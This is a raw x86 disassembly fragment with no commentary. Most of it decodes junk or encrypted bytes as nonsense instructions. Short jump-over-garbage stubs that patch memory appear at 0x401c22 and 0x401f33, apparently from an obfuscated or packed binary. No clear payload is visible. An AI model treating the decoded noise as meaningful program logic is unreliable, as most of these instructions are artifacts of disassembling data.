  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	fld    TBYTE PTR [esi]
  40192f:	push   0x77
  401931:	dec    esi
  401932:	jnp    0x4019b0
  401934:	jl     0x40199d
  401936:	jle    0x4019b4
  401938:	jl     0x40198c
  40193a:	xor    ebx,DWORD PTR [edi-0x65]
  40193d:	jns    0x401955
  40193f:	add    BYTE PTR [edi-0x73],dl
  401942:	add    BYTE PTR [ebp+0xfdc603d],ah
  401948:	in     al,0x2b
  40194a:	int3   
  40194b:	imul   ebx,DWORD PTR [esi],0xffffffec
  40194e:	outs   dx,BYTE PTR ds:[esi]
  40194f:	outs   dx,DWORD PTR ds:[esi]
  401950:	out    dx,eax
  401951:	adc    eax,DWORD PTR [eax-0x54]
  401954:	(bad)
  401958:	cwde   
  401959:	out    dx,al
  40195a:	dec    esp
  40195b:	mov    ebp,0x505f01bc
  401960:	sbb    eax,0x2eef156a
  401965:	bound  eax,QWORD PTR [ebx-0x32]
  401968:	jnp    0x40194c
  40196a:	sbb    BYTE PTR [edi+0x28],bh
  40196d:	call   0xd63d46d8
  401972:	dec    eax
  401973:	repnz xchg ecx,eax
  401975:	fidiv  WORD PTR [edx+ebp*2-0x14ef39e7]
  40197c:	lea    edi,[esi+0x46]
  40197f:	outs   dx,DWORD PTR ds:[esi]
  401980:	fild   QWORD PTR [edi+0x4f]
  401983:	cdq    
  401984:	inc    esi
  401985:	push   ds
  401986:	out    0xb2,eax
  401988:	scas   eax,DWORD PTR es:[edi]
  401989:	aam    0xb5
  40198b:	or     ch,BYTE PTR [edx]
  40198d:	outs   dx,DWORD PTR ds:[esi]
  40198e:	sbb    ah,BYTE PTR [ebp+eax*2-0x5cad7225]
  401995:	in     eax,dx
  401996:	and    ecx,edi
  401998:	xor    ebx,ebx
  40199a:	daa    
  40199b:	aad    0x12
  40199d:	in     eax,dx
  40199e:	ror    BYTE PTR [ebp+0x5],cl
  4019a1:	dec    ebp
  4019a2:	rol    ebp,1
  4019a4:	popa   
  4019a5:	cwde   
  4019a6:	or     eax,0xcbaac98b
  4019ab:	pop    edi
  4019ac:	xor    BYTE PTR [edi+0x5e],cl
  4019af:	mov    eax,ds
  4019b1:	push   ebx
  4019b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019b3:	rol    DWORD PTR [esi-0x43],cl
  4019b6:	push   esi
  4019b7:	lea    ebp,ds:0x9d9d615a
  4019bd:	pop    DWORD PTR [ecx-0x44b284c5]
  4019c3:	imul   esi,ebp,0x49dc5afc
  4019c9:	push   es
  4019ca:	inc    esp
  4019cb:	cs mul al
  4019ce:	in     al,0x9f
  4019d0:	fdivr  QWORD PTR [edx+0x29]
  4019d3:	ret    
  4019d4:	mov    DWORD PTR [ebx],ecx
  4019d6:	adc    BYTE PTR [ebx+0x3e307cc3],cl
  4019dc:	out    dx,al
  4019dd:	call   0x66da:0x4c759845
  4019e4:	jne    0x401999
  4019e6:	or     eax,0xf29539b8
  4019eb:	push   cs
  4019ec:	cmp    DWORD PTR [eax],ebp
  4019ee:	(bad)  
  4019ef:	fist   DWORD PTR [edx+0x74672681]
  4019f5:	xor    BYTE PTR [eax],bl
  4019f7:	cwde   
  4019f8:	ss (bad) 
  4019fa:	mov    cl,0xa0
  4019fc:	or     DWORD PTR [esi-0x62],0xffffff9a
  401a00:	test   al,0x8d
  401a02:	idiv   BYTE PTR [ecx+0x68f67c70]
  401a08:	dec    BYTE PTR [esi]
  401a0a:	fprem1 
  401a0c:	fs adc eax,0xe2e92b54
  401a12:	push   eax
  401a13:	fcmovnbe st,st(3)
  401a15:	sar    BYTE PTR [ecx+0x3a],1
  401a18:	xchg   edi,eax
  401a19:	ret    0xb627
  401a1c:	stos   BYTE PTR es:[edi],al
  401a1d:	inc    edx
  401a1e:	dec    ebp
  401a1f:	inc    edi
  401a20:	fdivr  st(5),st
  401a22:	push   eax
  401a23:	fwait
  401a24:	(bad)  
  401a25:	stc    
  401a26:	jg     0x401a66
  401a28:	aad    0x83
  401a2a:	xchg   ebx,eax
  401a2b:	add    esp,esp
  401a2d:	call   0x7a76d96a
  401a32:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  401a34:	fidiv  WORD PTR [edx-0x2c52fec6]
  401a3a:	mov    al,0x16
  401a3c:	retf   0xa2d6
  401a3f:	adc    eax,0xedaf7de
  401a44:	xor    BYTE PTR [ebp-0x16],cl
  401a47:	pop    edi
  401a48:	ror    BYTE PTR [ebp+0x5f],0x7d
  401a4c:	and    DWORD PTR [eax+0x3cb0a7cf],eax
  401a52:	or     ebp,DWORD PTR [edx]
  401a54:	push   edi
  401a55:	loopne 0x401a28
  401a57:	rol    DWORD PTR [esi-0x1b],1
  401a5a:	add    ah,BYTE PTR [ebx-0x346e262c]
  401a60:	out    dx,al
  401a61:	xchg   esp,eax
  401a62:	mov    dh,0x24
  401a64:	add    eax,0x27e72cf
  401a69:	and    edi,DWORD PTR [ecx-0x74]
  401a6c:	fs ret 0xe309
  401a70:	in     eax,dx
  401a71:	or     eax,0x85679b9d
  401a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a77:	out    dx,al
  401a78:	mov    al,ds:0xb0bef3a8
  401a7d:	and    dl,BYTE PTR [ebx-0x7f]
  401a80:	sbb    esi,edi
  401a82:	into   
  401a83:	inc    edi
  401a84:	out    0xed,al
  401a86:	jnp    0x401ac3
  401a88:	les    esp,FWORD PTR [edx+0x33f05592]
  401a8e:	xor    DWORD PTR [eax-0x7b192a9e],ecx
  401a94:	or     esi,edi
  401a96:	sub    al,0xd6
  401a98:	out    dx,al
  401a99:	adc    ebx,eax
  401a9b:	cdq    
  401a9c:	jb     0x401a22
  401a9e:	popa   
  401a9f:	fwait
  401aa0:	ret    
  401aa1:	sbb    dl,BYTE PTR [edi+0x5f]
  401aa4:	dec    esp
  401aa5:	aam    0x8b
  401aa7:	gs sub al,0xaf
  401aaa:	(bad)
  401aad:	or     edx,esp
  401aaf:	mov    al,0x2e
  401ab1:	call   0x80aa:0xde61403b
  401ab8:	mov    bh,0x3b
  401aba:	push   ss
  401abb:	sbb    DWORD PTR [eax+0x72b113cb],ecx
  401ac1:	imul   edi,DWORD PTR [ecx],0x9875a2e8
  401ac7:	push   ecx
  401ac8:	adc    esi,DWORD PTR [edx-0xf]
  401acb:	(bad)  
  401acc:	cmp    eax,0xc3e6dd5
  401ad1:	mov    esp,0xe9498d9b
  401ad6:	(bad)  
  401ad7:	mov    edi,0x8e354d9b
  401adc:	dec    esp
  401add:	or     eax,0xfc69cd2f
  401ae2:	adc    ch,BYTE PTR [edx]
  401ae4:	pop    eax
  401ae5:	lds    ecx,FWORD PTR [edi]
  401ae7:	adc    bh,BYTE PTR [ebx-0x5e]
  401aea:	cmp    al,0x9d
  401aec:	adc    edx,DWORD PTR [ebx+0x6de61a62]
  401af2:	and    ch,BYTE PTR ds:0xdaaa0c1b
  401af8:	lock in al,dx
  401afa:	ds mov cl,0xf2
  401afd:	fadd   DWORD PTR [ecx-0x6b]
  401b00:	xchg   esp,eax
  401b01:	popf   
  401b02:	or     bl,BYTE PTR [ebx-0x5]
  401b05:	mov    eax,0x4d7200f
  401b0a:	pop    esp
  401b0b:	xchg   esp,eax
  401b0c:	call   0x32e4ff99
  401b11:	adc    al,0x50
  401b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b15:	push   ss
  401b16:	sbb    BYTE PTR [edx+esi*8],ah
  401b19:	xchg   edx,edx
  401b1b:	push   eax
  401b1c:	adc    DWORD PTR [edi],edx
  401b1e:	sub    al,0x41
  401b20:	lds    edx,FWORD PTR [ecx-0x5a]
  401b23:	in     eax,dx
  401b24:	inc    ecx
  401b25:	(bad)  
  401b26:	xor    dh,cl
  401b28:	int    0x2f
  401b2a:	sub    ebp,DWORD PTR [esi-0x3aab827a]
  401b30:	shl    bl,0xb4
  401b33:	push   edx
  401b34:	add    bh,BYTE PTR [eax+0x1584a16d]
  401b3a:	xchg   ebp,eax
  401b3b:	add    al,BYTE PTR [ebp+0x36]
  401b3e:	jne    0x401b19
  401b40:	rcl    BYTE PTR [ecx+0x7f],1
  401b43:	test   eax,0x3934952e
  401b48:	sbb    bl,BYTE PTR [eax]
  401b4a:	repnz or ebx,DWORD PTR [edi]
  401b4d:	push   ecx
  401b4e:	pop    ecx
  401b4f:	mov    BYTE PTR [eax+ebp*4],ch
  401b52:	and    eax,DWORD PTR [edx]
  401b54:	scas   eax,DWORD PTR es:[edi]
  401b55:	sub    esi,DWORD PTR [ecx+0x48d5956f]
  401b5b:	inc    edi
  401b5c:	jmp    0x401b16
  401b5e:	jo     0x401bcf
  401b60:	xor    esi,ebx
  401b62:	push   ebp
  401b63:	jns    0x401ba6
  401b65:	sbb    eax,DWORD PTR [edi]
  401b67:	pop    es
  401b68:	jmp    0x9a34:0xfddb57cd
  401b6f:	mov    esp,0xdef86a8d
  401b74:	jmp    0xf9c1:0xe7a55a0c
  401b7b:	repz mov bl,0x8d
  401b7e:	sar    DWORD PTR [ecx],1
  401b80:	retf   0x4931
  401b83:	sub    eax,0x79d1e04b
  401b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b89:	or     cl,BYTE PTR ss:0x9fd26bbe
  401b90:	inc    ecx
  401b91:	xchg   ebp,eax
  401b92:	fst    QWORD PTR [edx+ecx*8+0x357a4ab]
  401b99:	shr    BYTE PTR [ecx+0x3020973b],0x80
  401ba0:	cmp    ebx,DWORD PTR [eax]
  401ba2:	ins    DWORD PTR es:[edi],dx
  401ba3:	test   al,0x9c
  401ba5:	adc    ebx,edx
  401ba7:	inc    edi
  401ba8:	nop
  401ba9:	dec    edi
  401baa:	test   DWORD PTR [ebx+0x7],ebp
  401bad:	daa    
  401bae:	push   DWORD PTR [ecx+eiz*1]
  401bb1:	mov    ebp,0x45eb117a
  401bb6:	cmp    eax,0x34cf7f7e
  401bbb:	pop    ds
  401bbc:	cmp    dl,ah
  401bbe:	fld    DWORD PTR [edx+0x52]
  401bc1:	cwde   
  401bc2:	fld    DWORD PTR [esi]
  401bc4:	int3   
  401bc5:	sub    eax,0x436281cf
  401bca:	test   BYTE PTR [edi+0x4c],ah
  401bcd:	int    0xc6
  401bcf:	out    dx,al
  401bd0:	push   edx
  401bd1:	leave  
  401bd2:	mov    esi,0xcba9be21
  401bd7:	and    al,0x85
  401bd9:	mov    al,ds:0x52a5e06a
  401bde:	or     DWORD PTR [edi-0x63],edx
  401be1:	cmp    bh,BYTE PTR [ebx-0x540362f3]
  401be7:	push   edi
  401be8:	lea    esp,[ebp+0x6]
  401beb:	add    ecx,ecx
  401bed:	mov    eax,ds:0xa0bee372
  401bf2:	fwait
  401bf3:	sbb    eax,0xee1a619f
  401bf8:	fmul   QWORD PTR [ebp+0x4ab1571]
  401bfe:	lock aam 0x7f
  401c01:	ja     0x401bda
  401c03:	jl     0x401c2b
  401c05:	int    0x92
  401c07:	xchg   edi,eax
  401c08:	inc    ecx
  401c09:	pop    edx
  401c0a:	xchg   esi,eax
  401c0b:	mov    esp,0xdbec3497
  401c10:	bound  edi,QWORD PTR [ecx]
  401c12:	outs   dx,DWORD PTR ds:[esi]
  401c13:	fadd   st,st(7)
  401c15:	cmp    BYTE PTR [ebp+0x15c04fe7],cl
  401c1b:	lods   eax,DWORD PTR ds:[esi]
  401c1c:	cdq    
  401c1d:	push   ss
  401c1e:	or     edx,edi
  401c20:	mov    cl,0xd7
  401c22:	xor    ecx,esi
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0x68959b5b
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401c2a
  401c4b:	mov    BYTE PTR [esi+ebx*2-0x6b78c62c],cl
  401c52:	mov    dh,0xa7
  401c54:	popa   
  401c55:	jne    0x401c21
  401c57:	or     ecx,DWORD PTR [eax-0x7a5e0369]
  401c5d:	ja     0x401c8e
  401c5f:	gs dec ebx
  401c61:	mov    WORD PTR [ecx-0x5843f37f],?
  401c67:	add    eax,0x4a1bbb64
  401c6c:	xchg   ecx,eax
  401c6d:	iret   
  401c6e:	jnp    0x401ca1
  401c70:	xchg   esi,eax
  401c71:	sub    ebx,DWORD PTR [ebp*1+0x2f94ea6e]
  401c78:	fwait
  401c79:	push   edx
  401c7a:	(bad)  
  401c7c:	jbe    0x401c9d
  401c7e:	jmp    0x1232:0x4bf81136
  401c85:	mov    eax,ds:0xf82a49db
  401c8a:	mov    esi,0x18f4d4c7
  401c8f:	(bad)  
  401c90:	neg    BYTE PTR [eax-0x63a16742]
  401c96:	jle    0x401c9e
  401c98:	adc    BYTE PTR [edi+0x222e7f03],al
  401c9e:	mov    bl,0x69
  401ca0:	loope  0x401c7e
  401ca2:	scas   eax,DWORD PTR es:[edi]
  401ca3:	repnz test eax,0x8bd3c1fe
  401ca9:	cdq    
  401caa:	push   0xc97648e5
  401caf:	adc    al,0x4b
  401cb1:	pop    ebp
  401cb2:	xchg   ecx,eax
  401cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cb4:	shl    ebp,cl
  401cb6:	adc    BYTE PTR [ebx-0x72596754],dl
  401cbc:	pop    edx
  401cbd:	sbb    dh,BYTE PTR [esi-0x3e]
  401cc0:	or     ch,BYTE PTR [edx]
  401cc2:	je     0x401cfc
  401cc4:	jp     0x401cf3
  401cc6:	fs jns 0x401d20
  401cc9:	fbld   TBYTE PTR [ebx]
  401ccb:	push   ecx
  401ccc:	loop   0x401cbc
  401cce:	mov    dl,0x7f
  401cd0:	stos   BYTE PTR es:[edi],al
  401cd1:	repz mov WORD PTR [ebx],?
  401cd4:	push   ss
  401cd5:	dec    ecx
  401cd6:	push   0xb72432c6
  401cdb:	pop    ebp
  401cdc:	stos   DWORD PTR es:[edi],eax
  401cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cde:	(bad)  
  401ce0:	or     DWORD PTR [esi+0x10],0xffffffcf
  401ce4:	and    DWORD PTR [eax-0x31],ecx
  401ce7:	dec    esp
  401ce8:	iret   
  401ce9:	cmp    ah,cl
  401ceb:	add    al,0x0
  401ced:	add    al,0x53
  401cef:	js     0x401cfa
  401cf1:	mov    dl,0x22
  401cf3:	out    dx,eax
  401cf4:	jo     0x401d56
  401cf6:	dec    esi
  401cf7:	shl    ebp,cl
  401cf9:	nop
  401cfa:	mov    al,ds:0x35f65013
  401cff:	push   ebp
  401d00:	fwait
  401d01:	jns    0x401d02
  401d03:	or     bl,BYTE PTR [edi-0x2a]
  401d06:	xchg   BYTE PTR [ecx-0x21],ch
  401d09:	pop    ebp
  401d0a:	or     eax,0xec4d240f
  401d0f:	in     eax,dx
  401d10:	xor    eax,0xd3b8a05f
  401d15:	pop    ss
  401d16:	pop    es
  401d17:	std    
  401d18:	sub    BYTE PTR [eax+0x5f0e7265],bl
  401d1e:	mov    dh,0x3f
  401d20:	test   al,0x0
  401d22:	sbb    eax,0x6de60a8a
  401d27:	fs inc edx
  401d29:	fs clc 
  401d2b:	mov    al,0x62
  401d2d:	aam    0x78
  401d2f:	int    0xd2
  401d31:	push   ss
  401d32:	cld    
  401d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d34:	(bad)
  401d38:	xchg   esi,eax
  401d39:	div    DWORD PTR [ebx+0x58f1deb7]
  401d3f:	clc    
  401d40:	mov    esi,0x7a9517c0
  401d45:	jb     0x401d15
  401d47:	jecxz  0x401d82
  401d49:	cmp    DWORD PTR [eax+0x59],0xc759d999
  401d50:	addr16 sub ecx,0xb343e5a5
  401d57:	and    DWORD PTR [eax+0x55301c31],ebx
  401d5d:	sub    BYTE PTR ds:0xb66a5a2c,ch
  401d63:	cli    
  401d64:	out    0x5f,eax
  401d66:	rcr    DWORD PTR [esi],1
  401d68:	aad    0x90
  401d6a:	stos   BYTE PTR es:[edi],al
  401d6b:	call   0xdda12501
  401d70:	dec    ecx
  401d71:	or     edi,DWORD PTR [ebp+0xe54ada9]
  401d77:	sub    DWORD PTR [edi+ebx*2+0x5444a722],esi
  401d7e:	vfnmadd132pd xmm6,xmm2,XMMWORD PTR [ebp+ebp*2-0x6a]
  401d85:	scas   al,BYTE PTR es:[edi]
  401d86:	mov    esi,0x373b6b2b
  401d8b:	mov    ch,0x28
  401d8d:	inc    esi
  401d8e:	or     DWORD PTR [ecx+ebx*4+0x3f1bed],eax
  401d95:	xchg   esi,eax
  401d96:	mov    dl,0xaa
  401d98:	dec    eax
  401d99:	mov    esp,0xfed74bc3
  401d9e:	xchg   ebx,eax
  401d9f:	test   al,0xde
  401da1:	repnz xchg ah,bl
  401da4:	push   ds
  401da5:	frndint 
  401da7:	shl    DWORD PTR [edi+0x3],cl
  401daa:	inc    ebp
  401dab:	fisubr DWORD PTR [edi]
  401dad:	es (bad) 
  401daf:	mov    eax,ds:0xb33013c1
  401db4:	gs mov ecx,0xc24207ee
  401dba:	jmp    FWORD PTR [esi+ebp*4+0x21]
  401dbe:	pop    eax
  401dbf:	int    0x83
  401dc1:	jp     0x401e34
  401dc3:	mov    edi,0xc143d7ba
  401dc8:	xor    edi,DWORD PTR [ebx]
  401dca:	or     BYTE PTR [eax+0x74],0x50
  401dce:	sti    
  401dcf:	in     eax,dx
  401dd0:	mov    ecx,0x1e2dc11c
  401dd5:	sub    DWORD PTR [esi+eax*1-0x507b28cd],esi
  401ddc:	xor    esi,DWORD PTR [edi]
  401dde:	shl    DWORD PTR [eax],cl
  401de0:	out    dx,al
  401de1:	push   eax
  401de2:	push   ebx
  401de3:	xlat   BYTE PTR ds:[ebx]
  401de4:	mov    ah,0xb8
  401de6:	mov    DWORD PTR [esi+0x5b],esi
  401de9:	and    eax,0xb50aa3c7
  401dee:	inc    eax
  401def:	mov    edi,0x502e0dcf
  401df4:	sub    eax,0x38d00234
  401df9:	stos   BYTE PTR es:[edi],al
  401dfa:	pop    edi
  401dfb:	test   bh,ch
  401dfd:	daa    
  401dfe:	push   ds
  401dff:	arpl   bx,dx
  401e01:	mov    dh,0x8b
  401e03:	jns    0x401e08
  401e05:	clc    
  401e06:	sbb    ch,BYTE PTR [ebp-0x1485141c]
  401e0c:	pop    eax
  401e0d:	jns    0x401dca
  401e0f:	cli    
  401e10:	cli    
  401e11:	and    cl,BYTE PTR [esi]
  401e13:	jg     0x401e3a
  401e15:	adc    edi,esp
  401e17:	mov    esi,0x673a57ce
  401e1c:	xchg   edi,eax
  401e1d:	dec    ecx
  401e1e:	mov    ds:0x88554569,al
  401e23:	add    eax,0x1c2ff781
  401e28:	mov    eax,ds:0xeea42cd6
  401e2d:	(bad)  
  401e2e:	jae    0x401dc4
  401e30:	add    al,0x18
  401e32:	daa    
  401e33:	xor    edi,ecx
  401e35:	push   edx
  401e36:	or     ah,BYTE PTR [esi+0x4a]
  401e39:	jbe    0x401e74
  401e3b:	or     BYTE PTR [ebx],dl
  401e3d:	adc    ch,0x99
  401e40:	mov    al,es:0x5931a749
  401e46:	jge    0x401e9a
  401e48:	outs   dx,DWORD PTR ds:[esi]
  401e49:	in     eax,dx
  401e4a:	in     al,dx
  401e4b:	stc    
  401e4c:	je     0x401df1
  401e4e:	jge    0x401e3f
  401e50:	enter  0xd9c2,0x34
  401e54:	mov    edi,0xfb1cbe4a
  401e59:	bound  ebx,QWORD PTR [edi]
  401e5b:	sbb    bh,BYTE PTR [edx]
  401e5d:	loopne 0x401df3
  401e5f:	sbb    DWORD PTR [edx],eax
  401e61:	inc    edx
  401e62:	push   edi
  401e63:	bound  ebx,QWORD PTR [eax+0x3b723af1]
  401e69:	outs   dx,DWORD PTR ds:[esi]
  401e6a:	xor    dh,dh
  401e6c:	adc    BYTE PTR [esp+eiz*8],ch
  401e6f:	pop    eax
  401e70:	cmp    cl,bh
  401e72:	in     al,0xfa
  401e74:	xor    DWORD PTR [ebp-0x35],edx
  401e77:	adc    DWORD PTR [esi+0x52],ebx
  401e7a:	repz sub eax,0xd31f526d
  401e80:	call   FWORD PTR [edx+0x17]
  401e83:	imul   ebx,DWORD PTR [ecx-0x5d],0x7af13fc3
  401e8a:	add    eax,0x20f9537
  401e8f:	mov    esp,0x6eb9a05f
  401e94:	mov    al,0xa
  401e96:	js     0x401e8b
  401e98:	dec    ecx
  401e99:	or     BYTE PTR [ebx-0x6974270e],dl
  401e9f:	adc    eax,0x167faf7
  401ea4:	rol    DWORD PTR [ebx],0xe9
  401ea7:	(bad)  
  401ea8:	lds    ebp,FWORD PTR [ebx-0x4]
  401eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eac:	pop    es
  401ead:	aad    0xcb
  401eaf:	xor    eax,0x67fa3145
  401eb4:	fs (bad) 
  401eb6:	in     al,dx
  401eb7:	aas    
  401eb8:	sub    al,0x7e
  401eba:	sar    bl,0x1d
  401ebd:	call   0x61e:0x887b1f2
  401ec4:	addr16 mov ebx,0xc0290940
  401eca:	gs mov cl,0x88
  401ecd:	mov    bh,0x3b
  401ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed0:	add    al,0xc0
  401ed2:	sbb    esp,eax
  401ed4:	repnz pusha 
  401ed6:	repnz mov edi,0x829d573f
  401edc:	fisub  WORD PTR ds:0xbbdf91c5
  401ee2:	gs push ds
  401ee4:	ins    BYTE PTR es:[edi],dx
  401ee5:	test   eax,0x795abc39
  401eea:	cdq    
  401eeb:	and    ah,BYTE PTR ds:0x331cb977
  401ef1:	leave  
  401ef2:	test   dh,bl
  401ef4:	sbb    edx,DWORD PTR [edx]
  401ef6:	push   esp
  401ef7:	push   esp
  401ef8:	mov    edx,0x3ef7d76b
  401efd:	jae    0x401ea8
  401eff:	pop    esi
  401f00:	enter  0x5d0e,0x8f
  401f04:	pop    es
  401f05:	jb     0x401ec4
  401f07:	add    esi,DWORD PTR [edi]
  401f09:	not    ch
  401f0b:	fcom   DWORD PTR [bx+si]
  401f0e:	dec    edx
  401f0f:	jp     0x401e9a
  401f11:	pop    es
  401f12:	mov    bh,0x7
  401f14:	clc    
  401f15:	ss xchg ecx,eax
  401f17:	fs je  0x401f49
  401f1a:	pop    esp
  401f1b:	loopne 0x401f59
  401f1d:	sub    ebx,ebx
  401f1f:	inc    ebx
  401f20:	adc    BYTE PTR [edx],ah
  401f22:	push   edx
  401f23:	adc    al,0x54
  401f25:	out    dx,eax
  401f26:	add    al,0x2e
  401f28:	or     BYTE PTR cs:[eax],al
  401f2b:	hlt    
  401f2c:	aam    0x84
  401f2e:	mov    esi,0x79c6ac5a
  401f33:	mov    eax,ds:0x413bea
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0x377da50
  401f5d:	mov    bl,BYTE PTR [eax+0x677c7c01]
  401f63:	jle    0x401fe1
  401f65:	jl     0x401f08
  401f67:	dec    ebp
  401f68:	inc    edx
  401f69:	in     al,dx
  401f6a:	sahf   
  401f6b:	sub    edx,DWORD PTR [edi+edi*1+0x4b]
  401f6f:	enter  0x3ce1,0xe5
  401f73:	stc    
  401f74:	xor    al,0x22
  401f76:	sbb    ebx,ebp
  401f78:	sar    BYTE PTR [edx],1
  401f7a:	pop    esi
  401f7b:	mov    ecx,DWORD PTR [ebp+edi*1-0xbb7c308]
  401f82:	mov    bl,0x69
  401f84:	mov    BYTE PTR [esi],ch
  401f86:	dec    ebx
  401f87:	xor    eax,0x40076e51
  401f8c:	sub    esi,ebp
  401f8e:	ja     0x401f78
  401f90:	das    
  401f91:	repz mov fs,ecx
  401f94:	int3   
  401f95:	out    0xc3,eax
  401f97:	pop    edx
  401f98:	mov    edi,0x20f03e38
  401f9d:	xchg   BYTE PTR [ebp-0x6a],cl
  401fa0:	arpl   dx,si
  401fa2:	inc    edi
  401fa3:	inc    esi
  401fa4:	lea    eax,[ecx-0x47325ad5]
  401faa:	xor    al,BYTE PTR ds:0xdbeb9300
  401fb0:	and    DWORD PTR [ebx],edx
  401fb2:	add    BYTE PTR [eax-0x1fe1dd40],cl
  401fb8:	sbb    cl,cl
  401fba:	stc    
  401fbb:	adc    eax,0x6fd87ba4
  401fc0:	dec    edi
  401fc1:	mov    al,0x92
  401fc3:	clc    
  401fc4:	je     0x4e667ed8
  401fca:	dec    ecx
  401fcb:	sub    al,bh
  401fcd:	xor    DWORD PTR [ecx],ecx
  401fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fd0:	and    esi,esp
  401fd2:	mov    WORD PTR [ecx+ebp*4-0x59],?
  401fd6:	in     eax,dx
  401fd7:	push   0x53b07d5c
  401fdc:	mov    ds,edi
  401fde:	dec    ebp
  401fdf:	or     al,BYTE PTR [esi]
  401fe1:	fiadd  WORD PTR [ebx-0x2a22046d]
  401fe7:	test   BYTE PTR [edi],cl
  401fe9:	sar    edi,0xfe
  401fec:	pop    esi
  401fed:	sti    
  401fee:	(bad)  
  401ff0:	icebp  
  401ff1:	and    al,0x96
  401ff3:	out    0x10,al
  401ff5:	pop    ebx
  401ff6:	(bad)  
  401ff7:	packssdw mm1,QWORD PTR [eax]
  401ffa:	jo     0x401fb1
  401ffc:	lea    ebp,[eax]
  401ffe:	iret   
  401fff:	out    dx,eax
  402000:	and    DWORD PTR [eax-0x35bb2aa2],ebp
  402006:	mov    al,ds:0x67641069
  40200b:	or     BYTE PTR [ebx+edx*4-0x5c54d123],ah
  402012:	js     0x40202c
  402014:	fcomp  DWORD PTR [edi]
  402016:	shr    DWORD PTR [edx],1
  402018:	mov    esi,0x34eeb29e
  40201d:	(bad)  
  40201e:	cmp    eax,0x8b4fd1a3
  402023:	lea    ecx,[edx]
  402025:	cmp    DWORD PTR [ebx-0x11],esi
  402028:	clc    
  402029:	aas    
  40202a:	xchg   BYTE PTR [esi-0x7e],al
  40202d:	xor    edi,DWORD PTR [esi-0x4adeb690]
  402033:	cmp    DWORD PTR [edi+0x62c417a3],ebx
  402039:	xchg   DWORD PTR [edi-0x5e],esi
  40203c:	jl     0x402048
  40203e:	mov    ds:0xf8e3fb41,eax
  402043:	or     ch,BYTE PTR [esi+ebp*8-0xa]
  402047:	mov    ch,0xe0
  402049:	cli    
  40204a:	lods   eax,DWORD PTR ds:[esi]
  40204b:	and    ebp,edi
  40204d:	and    DWORD PTR [eax],esp
  40204f:	cmp    esp,DWORD PTR [eax+0x2e0993d6]
  402055:	push   edx
  402056:	aas    
  402057:	mov    ecx,0x5b50ac3d
  40205c:	loopne 0x401feb
  40205e:	clc    
  40205f:	scas   al,BYTE PTR es:[edi]
  402060:	inc    edx
  402061:	js     0x402091
  402063:	or     ecx,DWORD PTR [ebx]
  402065:	inc    ecx
  402066:	jmp    0x402053
  402068:	(bad)  
  402069:	and    BYTE PTR [ebp+0x6a],bl
  40206c:	test   al,0xd2
  40206e:	add    BYTE PTR [edi+0xfae7dba],dl
  402074:	pop    edi
  402075:	fcomp  DWORD PTR [esi]
  402077:	fdivr  st,st(6)
  402079:	jle    0x402040
  40207b:	jmp    0x402008
  40207d:	(bad)  
  40207e:	in     al,0x2e
  402080:	add    eax,0xd0780
  402085:	jl     0x4020d3
  402087:	jmp    0x4020e9
  402089:	dec    ebp
  40208a:	inc    edx
  40208b:	inc    edx
  40208c:	adc    eax,0xa78b6da7
  402091:	std    
  402092:	mov    bh,0xe5
  402094:	mov    dl,0x78
  402096:	push   edx
  402097:	jle    0x402112
  402099:	mov    ds,WORD PTR [eax+0x7f085f43]
  40209f:	cmp    ebx,esi
  4020a1:	mov    bh,0x98
  4020a3:	sub    DWORD PTR [ecx-0x49be751e],eax
  4020a9:	ret    0x98a4
  4020ac:	scas   al,BYTE PTR es:[edi]
  4020ad:	les    esp,FWORD PTR [edx+0x68]
  4020b0:	ret    0xc94f
  4020b3:	adc    ch,ch
  4020b5:	in     al,0xf2
  4020b7:	lds    ecx,FWORD PTR [esi-0x42]
  4020ba:	cld    
  4020bb:	jb     0x402130
  4020bd:	and    bl,bh
  4020bf:	jnp    0x4020e0
  4020c1:	pop    ebp
  4020c2:	sti    
  4020c3:	cmp    bl,BYTE PTR [ebp-0x506fa73a]
  4020c9:	repz test eax,0xe92445b7
  4020cf:	mov    ah,0x83
  4020d1:	xchg   edx,eax
  4020d2:	fs xor edx,ecx
  4020d5:	add    al,0x12
  4020d7:	jg     0x4020de
  4020d9:	or     al,0xc7
  4020db:	rcr    BYTE PTR [ebx],1
  4020dd:	jmp    0x4020fa
  4020df:	adc    BYTE PTR [ebx-0x40],al
  4020e2:	xchg   BYTE PTR [edx+0x29],al
  4020e5:	pop    edi
  4020e6:	and    esi,DWORD PTR [ebx]
  4020e8:	mov    ecx,0x2c8518fa
  4020ed:	xor    cl,bl
  4020ef:	pop    ebp
  4020f0:	inc    BYTE PTR [eax-0x1b6f4f7]
  4020f6:	and    eax,0x27ffa375
